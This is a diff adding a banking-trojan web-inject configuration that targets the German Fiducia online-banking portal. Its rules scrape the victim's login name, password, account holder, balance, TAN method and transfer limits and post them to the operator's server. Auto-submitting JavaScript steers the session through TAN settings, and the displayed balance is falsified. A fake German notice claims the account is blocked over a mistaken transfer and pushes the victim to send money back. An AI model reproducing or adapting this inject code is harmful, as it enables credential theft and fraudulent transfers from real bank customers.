@@ -1,0 +1,6253 @@
+INJECTFILE
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ITHEADERSCRTIMER=|2000|End
+ITHEADERSCRLIMIT=|30|End
+ITHEADERSCRMINDELAY=|30000|End
+
+
+
+======================================================================
+
+ITVARNAME=|%TELFALSE%|End
+ITVARPR=|00|End
+ITVARVALUE=|0840 555555|End
+
+
+ITVARNAME=|%LOCKMESSAGE%|End
+ITVARPR=|00|End
+ITVARVALUE=|<h2>Leider steht das Online-Banking derzeit nicht zur Verf&uuml;gung. Wir bem&uuml;hen uns darum, dass Ihnen unser Service schnellstm&ouml;glich wieder zur Verf&uuml;gung steht.</h2>|End
+
+================================ FIDU ================================
+
+
+ITSCRHOST=|finanzportal.fiducia.de|End
+ITSCRONSUCCESS=|1|End
+ITSCRPAGE=|/*/portal*token=*|End
+
+
+
+
+
+
+ITREQHOST=|finanzportal.fiducia.de|End
+ITREQPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITREQMETHOD=|211|End
+ITREQRXPREQ=||End
+ITREQMATH=||End
+ITREQSRVDATA=|?name=FIDU&bal=%FIDUBAL%&lim=&disp=&maxbetrag=%FIDUMAXBETR%&maxbetragsepa=%FIDUMAXBETRSEPA%&userhost=finanzportal.fiducia.de&useracc=%FIDURZBK% - %FIDUUSERACC% - %HOLDERNAME%&userpass=%FIDUUSERPASS%&exinf=%FIDUTANTYPE%&html=&trkid=%FIDUDEFNRSELE%&regexp=unv&hldrn=%HOLDERNAME%&vorg=&injv=20141111|End
+ITREQSRVERR=|%ITENABLED%=|-1|--%ITSTATUS%=|e|--|End
+ITREQIFCONTEXT=||End
+
+
+
+
+
+
+
+
+ITCMPACCHOST=|finanzportal.fiducia.de|End
+ITCMPACCPAGE=|/*/portal*?token=*|End
+ITCMPRXPREQ=||End
+ITCMPPRM=|1|End
+ITCMPACCIF=|*token=*&frontletId=*=Anmelden|End
+ITCMPACCPRC=|-1|End
+ITCMPREGNAME=|finanzportal.fiducia.de|End
+ITCMPACCNAME=|#4=|End
+ITCMPPRXPNAME=||End
+ITCMPACCREQ=||End
+ITCMPSRVERR=||End
+
+
+ITCMPACCHOST=|finanzportal.fiducia.de|End
+ITCMPACCPAGE=|/*/portal*?token=*|End
+ITCMPRXPREQ=||End
+ITCMPPRM=|1|End
+ITCMPACCIF=|*=anmelden&*&token=*&frontletId=*|End
+ITCMPACCPRC=|-1|End
+ITCMPREGNAME=|finanzportal.fiducia.de|End
+ITCMPACCNAME=|#5=|End
+ITCMPPRXPNAME=||End
+ITCMPACCREQ=||End
+ITCMPSRVERR=||End
+
+
+ITSUCCTRHOST=|finanzportal.fiducia.de|End
+ITSUCCTRPAGE=|/*/portal?token=*|End
+ITSUCCTRIFREQ=|*token=*&frontletId=*=OK|End
+ITSUCCTRPRM=|11|End
+ITSUCCTRCNR=|13|End
+ITSUCCTRSTR=|%KONTONUMMER%[*]%BANKCODE%[*]<li>Ihren Auftrag haben wir entgegengenommen.</li>|End
+ITSUCCTRFALSE=|/-/-/-/-/-/-/|End
+ITSUCCTRTHEN=||End
+ITSUCCTRELSE=||End
+
+ITSUCCTRHOST=|finanzportal.fiducia.de|End
+ITSUCCTRPAGE=|/*/portal?token=*|End
+ITSUCCTRIFREQ=|*=ausfuehren*token=*&frontletId=*|End
+ITSUCCTRPRM=|11|End
+ITSUCCTRCNR=|13|End
+ITSUCCTRSTR=|%KONTONUMMER%[*]%BANKCODE%[*]<li>Ihren Auftrag haben wir entgegengenommen.</li>|End
+ITSUCCTRFALSE=|/-/-/-/-/-/-/|End
+ITSUCCTRTHEN=||End
+ITSUCCTRELSE=||End
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*?token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*token=*&frontletId=*=Anmelden|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUUSERACC%[0000]|End
+ITINITSTART=|#4=|End
+ITINITEND=||End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*?token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*token=*&frontletId=*=Anmelden|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUUSERPASS%[0000]|End
+ITINITSTART=|#5=|End
+ITINITEND=||End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*?token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*=anmelden&*&token=*&frontletId=*|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUUSERACC%[0000]|End
+ITINITSTART=|#5=|End
+ITINITEND=||End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*?token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*=anmelden&*&token=*&frontletId=*|End
+ITINITPRM=|000|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUUSERPASS%[0000]|End
+ITINITSTART=|#6=|End
+ITINITEND=||End
+ITINITXPRREG=||End
+
+
+
+
+
+
+
+
+============= Step 1 ============
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*?token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*nmelden*|End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDURZBK%[0000]|End
+ITINITSTART=|/resource/unit.css?rzbk=|End
+ITINITEND=|&|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*?token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*nmelden*|End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%HOLDERNAME%[0001]|End
+ITINITSTART=|Name:[*]id="lblNameValue">|End
+ITINITEND=|</span>|End
+ITINITXPRREG=||End
+
+
+
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*?token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*nmelden*|End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUWEITERFRM%[0000]|End
+ITINITSTART=|<div class="crossnavBlock3">|End
+ITINITEND=|" method=|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*?token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*nmelden*|End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUWEITERFRM2%[0000]|End
+ITINITSTART=|<div class="crossnavBlock3">[*]" method="post">|End
+ITINITEND=|<div class="formInput">|End
+ITINITXPRREG=||End
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*?token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=|*nmelden*|End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUWEITERNM1%[0000]|End
+ITINITSTART=|<div class="crossnavBlock3">[*]<input alt="zur TAN-Verwaltung"[*] name="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=|*nmelden*|End
+ITINJFRM=|100000000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<html class="no-js">|End
+ITINJEND=|</html>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+<head></head><body>
+
+%FIDUWEITERFRM%&C4I89Op=0002" method="post" name="frmsubmit">
+%FIDUWEITERFRM2%
+<input type="hidden" name="%FIDUWEITERNM1%" value="zur TAN-Verwaltung">
+</form>
+
+<script language="JavaScript">
+document.frmsubmit.submit();
+</script></body>
+
+	      |End
+ITINJPASTEMN=||End
+
+
+============= Step 2 ============
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0002|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUTANTYPE%[0009]|End
+ITINITSTART=|<h1 class="stackedFrontletTitle">TAN-Verwaltung</h1>|End
+ITINITEND=|<div class="contentWerbung">|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0002|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUMENUBANKING%[0000]|End
+ITINITSTART=|<div id="navigation">[*]<a href="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*&C4I89Op=0002|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|100000000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<html class="no-js">|End
+ITINJEND=|</html>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+<head>  </head>  <body>
+
+<script language="JavaScript">
+function openUrl(url)
+{
+    var fakeLink = document.createElement('a');
+     if (typeof(fakeLink.click) == 'undefined')
+    {
+        location.href = url.replace("&amp;","&");
+    }
+    else
+    {
+	var ua = navigator.userAgent.toLowerCase();
+ 	if (ua.indexOf("gecko") != -1) {
+	 location.href = url.replace(new RegExp("&amp;",'g'),"&");
+	 } else
+	{
+	fakeLink.href = url.replace(new RegExp("&amp;",'g'),"&");;
+	document.body.appendChild(fakeLink);
+	fakeLink.click(); 
+	}
+
+
+    }
+     return true;
+}
+
+
+
+
+openUrl('https://finanzportal.fiducia.de%FIDUMENUBANKING%&C4I89Op=0003');
+</script></body>
+	      |End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+
+
+
+============= Step 3 ============
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0003|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUFRMREQ%[0000]|End
+ITINITSTART=|<div id="maincontent" class="maincontent_DEFAULT">|End
+ITINITEND=|" method=|End
+ITINITXPRREG=||End
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0003|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUTKFRID%[0000]|End
+ITINITSTART=|<div id="maincontent" class="maincontent_DEFAULT">[*]" method="post">|End
+ITINITEND=|<h1 class="|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0003|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUSELECT%[0000]|End
+ITINITSTART=|<select class="XChoiceCombo" id="[*]name="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0003|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUNOK%[0000]|End
+ITINITSTART=|<input alt="OK" class="[*]name="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*&C4I89Op=0003|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|100000000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<html class="no-js">|End
+ITINJEND=|</html>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+<head>
+</head>
+<body>
+%FIDUFRMREQ%&C4I89Op=0004" name="frmreq" method="post">
+%FIDUTKFRID%
+<input type="hidden" name="%FIDUSELECT%" value="1" />
+<input type="hidden" name="%FIDUNOK%" value="OK" />
+</form>
+
+<script language="JavaScript">
+document.frmreq.submit();
+</script>
+</body>
+	      |End
+ITINJPASTEMN=||End
+
+
+
+============= Step 4 ============
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUDEFNRSEL%[1000]|End
+ITINITSTART=|<option selected [*]>|End
+ITINITEND=|</option>|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUDEFNRSELE%[0007]|End
+ITINITSTART=|<dl id="jsKontoauswahl"[*]<li><a href="#" value="1">[*]<b>|End
+ITINITEND=|</b>|End
+ITINITXPRREG=||End
+
+
+
+
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUFRMREQ%[0000]|End
+ITINITSTART=|<div id="maincontent" class="maincontent_DEFAULT">|End
+ITINITEND=|" method=|End
+ITINITXPRREG=||End
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUTKFRID%[0000]|End
+ITINITSTART=|<div id="maincontent" class="maincontent_DEFAULT">[*]value="eingabePruefen">|End
+ITINITEND=|<h1 class="|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUACCNM%[0000]|End
+ITINITSTART=|id="chcKontoAuswahlZeile" name="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUACCVAL%[0000]|End
+ITINITSTART=|id="chcKontoAuswahlZeile" name="[*]<option selected value="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUSEPNM%[0000]|End
+ITINITSTART=|<select class="XChoiceList" id="chcZahlungsart" name="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUANDERN%[0000]|End
+ITINITSTART=|id="actZahlungsartWaehlen" name="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUDEFNRSELSEPA%[1000]|End
+ITINITSTART=|<option selected [*]>|End
+ITINITEND=|</option>|End
+ITINITXPRREG=||End
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUMENUBANKING%[0000]|End
+ITINITSTART=|<div id="navigation">[*]<a href="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000e000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<html class="no-js">|End
+ITINJEND=|</html>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+<head>  </head>  <body>
+
+<script language="JavaScript">
+function openUrl(url)
+{
+    var fakeLink = document.createElement('a');
+     if (typeof(fakeLink.click) == 'undefined')
+    {
+        location.href = url.replace("&amp;","&");
+    }
+    else
+    {
+	var ua = navigator.userAgent.toLowerCase();
+ 	if (ua.indexOf("gecko") != -1) {
+	 location.href = url.replace(new RegExp("&amp;",'g'),"&");
+	 } else
+	{
+	fakeLink.href = url.replace(new RegExp("&amp;",'g'),"&");;
+	document.body.appendChild(fakeLink);
+	fakeLink.click(); 
+	}
+
+
+    }
+     return true;
+}
+
+
+openUrl('https://finanzportal.fiducia.de%FIDUMENUBANKING%');
+</script></body>
+
+	      |End
+ITINJPASTEMN=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUPATH%[0000]|End
+ITINITSTART=|type="text/css" href="/|End
+ITINITEND=|/|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDURZBKRZID%[0000]|End
+ITINITSTART=|type="text/css" href="[*]?|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%FIDUBNAMEA%[0000]|End
+ITINITSTART=|<title>[*] - |End
+ITINITEND=|</title>|End
+ITINITXPRREG=||End
+
+
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<div id="maincontent" class="maincontent_DEFAULT">|End
+ITINJEND=|<div class="contentWerbung">|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+	<script language="JavaScript">
+
+function openUrl(url)
+{
+    var fakeLink = document.createElement('a');
+     if (typeof(fakeLink.click) == 'undefined')
+    {
+        location.href = url.replace("&amp;","&");
+    }
+    else
+    {
+	var ua = navigator.userAgent.toLowerCase();
+ 	if (ua.indexOf("gecko") != -1) {
+	 location.href = url.replace(new RegExp("&amp;",'g'),"&");
+	 } else
+	{
+	fakeLink.href = url.replace(new RegExp("&amp;",'g'),"&");;
+	document.body.appendChild(fakeLink);
+	fakeLink.click(); 
+	}
+
+
+    }
+     return true;
+}
+
+
+
+	function submitconfirm2() {
+
+		if (document.getElementById("subconf").checked==true)
+		{
+
+								openUrl('https://finanzportal.fiducia.de%FIDUMENUBANKING%');
+
+		} else
+		{
+		alert("Bitte, bestatigen, dass Sie entsperechend informiert sind.");
+		}
+
+	
+	return false;
+	}
+	</script>
+
+
+
+
+<form accept-charset="UTF-8" action="https://finanzportal.fiducia.de/%FIDUPATH%/portal" method="GET">
+
+
+
+<div class="formInput">
+<div class="XContainer" id="mainContent_root">
+<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;" width="100%">
+<tr>
+<td valign="top" width="100%">
+
+
+<br />
+
+</td>
+</tr>
+<tr>
+<td valign="top" width="100%">
+<div class="XContainer Tabellenblock" id="cntPosteingang">
+<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;" width="100%">
+<tr>
+<td valign="top" width="100%">
+<div class="XContainer Titel TitelIconText" id="cntPosteingangTitel">
+<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;">
+<tr>
+<td valign="middle" width="1%"><img alt="" height="1" src="/%FIDUPATH%/resource/xhtml-filler?%FIDURZBKRZID%" width="1"></td><td valign="middle" width="99%"><span class="XLabel Titel TitelText" id="lblPosteingangTitel">Postfach</span></td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td valign="top" width="100%">
+<table border="1" cellpadding="0" cellspacing="0" class="XTable TabellenblockInhalt" frame="hsides" id="tblPosteingang" rules="all">
+<colgroup>
+<col>
+</colgroup>
+<tbody>
+<tr>
+<td height="1" valign="top">
+<div class="XContainer" id="cntMitteilung">
+<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;" width="100%">
+<tr>
+
+
+
+<td valign="top" width="100%">
+
+<p>
+<span class="XLabel" id="lblPosteingang">Auf Ihr Girokonto %FIDUDEFNR% wurden %AMTFRMT% Euro verbucht. 
+Der Absender hat dieses Geld irrt&uuml;mlich auf dieses Girokonto &uuml;berwiesen und verlangt eine sofortige R&uuml;ckzahlung.</span>
+</p>
+
+
+<p>
+<span class="XLabel" id="lblPosteingang">Ihr Girokonto %FIDUDEFNR% ist deshalb vorl&auml;ufig gesperrt.</span>
+</p>
+
+
+
+<p>
+<span class="XLabel" id="lblPosteingang">Falls das Geld nachweislich f&uuml;r Sie bestimmt war, m&uuml;ssen Sie die 
+n&auml;chstliegende Bank Filiale aufsuchen und Belege vorzeigen, die es best&auml;tigen.</span>
+</p>
+
+
+<p>
+<span class="XLabel" id="lblPosteingang">Wenn Sie dies belegen k&ouml;nnen, wird Ihr Girokonto freigeschaltet.</span>
+</p>
+
+
+<p>
+<span class="XLabel" id="lblPosteingang">Sollte es sich tats&auml;chlich um eine Fehl&uuml;berweisung handeln und der 
+Auftraggeber ist Ihnen unbekannt, m&uuml;ssen Sie das Geld baldm&ouml;glichst zur&uuml;cksenden.</span>
+</p>
+
+<p>
+<span class="XLabel" id="lblPosteingang">Um automatisch eine R&uuml;ck&uuml;berweisung zu veranlassen und das Girokonto freizuschalten, klicken Sie unter "Kontoums&auml;tze" auf den Button "Retouren" welches neben der Falsch&uuml;berweisung zu finden ist.</span>
+</p>
+
+
+<br />
+
+
+
+<span class="XLabel" id="lblPosteingang">
+	<p align="right">
+	<i>Ihre %FIDUBNAMEA%</i><br />
+	</p><br />	<br />
+
+</span>
+
+</td>
+</tr></table></div></td></tr></tbody></table></td></tr></table></div></td></tr>
+
+
+
+
+<tr>
+<td valign="top" width="100%">
+<div class="XContainer FormularblockUndInhalt FormularblockEmbedded" id="cntAnzeigeSeite">
+<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;" width="100%">
+<tr>
+
+<td width="9"><img alt="" height="1" src="/%FIDUPATH%/resource/xhtml-filler?%FIDURZBKRZID%" width="9"></td>
+
+<td valign="middle"><input class="XBoolean" id="subconf" name="" type="checkbox" ></td>
+
+<td valign="middle"><span for="subconf" class="XLabel nowrap" id="lblAnzeige"><label for="subconf">Ich bin entsprechend informiert.</label></span></td>
+
+
+
+</tr></table></div></td></tr></table></div></div><div class="formSubmit">
+<div class="UnitCommands actionBar"><input class="UnitCommand" type="submit" value="Weiter" onclick="return submitconfirm2();"></div></div></form>
+
+
+
+
+
+
+
+
+	      |End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<div id="sekundaernavi">|End
+ITINJEND=|<div style="padding: 2.4em;">|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|<ul></ul>|End
+ITINJPASTEMN=||End
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<div id="primaernavi">[*]<div>|End
+ITINJEND=|</div> <!-- End #primaernavi -->|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+<div><div class="active">
+<a>Banking</a>
+</div></div><div class="primaerSpacer"></div></div>
+
+	     |End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*&C4I89Op=0004|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<div class="crossnavBlock3">|End
+ITINJEND=|<div class="crossnavBlock6">|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|</div>|End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+
+******************************* Share trans, statement *******************************
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<option selected value="1">%FIDUDEFNRSEL%|End
+ITINITNAME=|%FIDUBAL%[0000]|End
+ITINITSTART=|<span class="XLabel nowrap" id="lblKontoAuswahlSaldoLabel">Saldo in EUR:&nbsp;&nbsp;</span>[*]<span class="XLabel nowrap[*]" id="lbl">|End
+ITINITEND=|</span>|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<option selected value="2">%FIDUDEFNRSEL%|End
+ITINITNAME=|%FIDUBAL%[0000]|End
+ITINITSTART=|<span class="XLabel nowrap" id="lblKontoAuswahlSaldoLabel">Saldo in EUR:&nbsp;&nbsp;</span>[*]<span class="XLabel nowrap[*]" id="lbl">|End
+ITINITEND=|</span>|End
+ITINITXPRREG=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<option selected value="1">%FIDUDEFNRSEL%|End
+ITINJSTART=|<span class="XLabel nowrap" id="lblKontoAuswahlSaldoLabel">Saldo in EUR:&nbsp;&nbsp;</span>[*]<span class="XLabel nowrap|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=| " id="lbl">%FIDUBAL%+%AMOUNT%  H|End
+ITINJPASTEMN=| SollKennzeichnung" id="lbl">%FIDUBAL%+%AMOUNT%|End
+
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<option selected value="2">%FIDUDEFNRSEL%|End
+ITINJSTART=|<span class="XLabel nowrap" id="lblKontoAuswahlSaldoLabel">Saldo in EUR:&nbsp;&nbsp;</span>[*]<span class="XLabel nowrap|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=| " id="lbl">%FIDUBAL%+%AMOUNT%  H|End
+ITINJPASTEMN=| SollKennzeichnung" id="lbl">%FIDUBAL%+%AMOUNT%|End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<option selected value="1">%FIDUDEFNRSEL%|End
+ITINITNAME=|%FIDUMAXBETR%[0000]|End
+ITINITSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerBetragValue">[*]id="lbl">|End
+ITINITEND=| H</span>|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<option selected value="2">%FIDUDEFNRSEL%|End
+ITINITNAME=|%FIDUMAXBETR%[0000]|End
+ITINITSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerBetragValue">[*]id="lbl">|End
+ITINITEND=| H</span>|End
+ITINITXPRREG=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
